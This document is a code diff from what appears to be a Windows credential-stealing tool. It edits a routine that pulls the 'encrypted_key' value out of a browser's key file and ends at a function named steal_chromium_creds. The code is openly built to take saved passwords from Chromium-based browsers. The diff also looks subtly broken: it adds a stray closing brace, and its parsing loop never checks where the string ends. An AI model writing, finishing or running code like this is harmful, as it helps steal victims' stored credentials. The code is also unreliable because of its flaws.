@@ -148,7 +148,7 @@ PWSTR ansi_to_wide(PSTR ansiString) {
   return wideString;
 }
 
-PWSTR retrieve_encrypted_key(PWSTR filepath) {
+PSTR retrieve_encrypted_key(PWSTR filepath) {
   HANDLE hFile = CreateFileW(filepath, GENERIC_READ, FILE_SHARE_READ, NULL,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile == INVALID_HANDLE_VALUE) {
@@ -183,7 +183,7 @@ PWSTR retrieve_encrypted_key(PWSTR filepath) {
 
   buffer[fileSize] = '\0';  // terminate the buffer
 
-  const char *key = "encrypted_key\":";
+  const char *key = "\"encrypted_key\":";
   PSTR pos = strstr(buffer, key);
   if (!pos) {
     free(buffer);
@@ -192,16 +192,15 @@ PWSTR retrieve_encrypted_key(PWSTR filepath) {
 
   // skip the key
   pos += strlen(key);
-  // skip whitespace
-  while (*pos == ' ' || *pos == '\t' || *pos == '\n' || *pos == '\r') {
+  // skip whitespace and the beginning quote
+  while (*pos == ' ' || *pos == '\t' || *pos == '"') {
     pos++;
   }
 
   // keep start position of the encrypted key
   PSTR start = pos;
   // pos points to the end of the encrypted key (to get the length)
-  while (*pos != ' ' && *pos != '\t' && *pos != '\n' && *pos != '\r' &&
-         *pos != '\0' && *pos != ',' && *pos != '}') {
+  while (*pos != '"') {
     pos++;
   }
 
@@ -215,10 +214,9 @@ PWSTR retrieve_encrypted_key(PWSTR filepath) {
   strncpy(encryptedKey, start, length);
   encryptedKey[length] = '\0';
 
-  PWSTR wide_encrypted_key = ansi_to_wide(encryptedKey);
-
   free(buffer);
-  return wide_encrypted_key;
+  return encryptedKey;
+}
 }
 
 int steal_chromium_creds() {
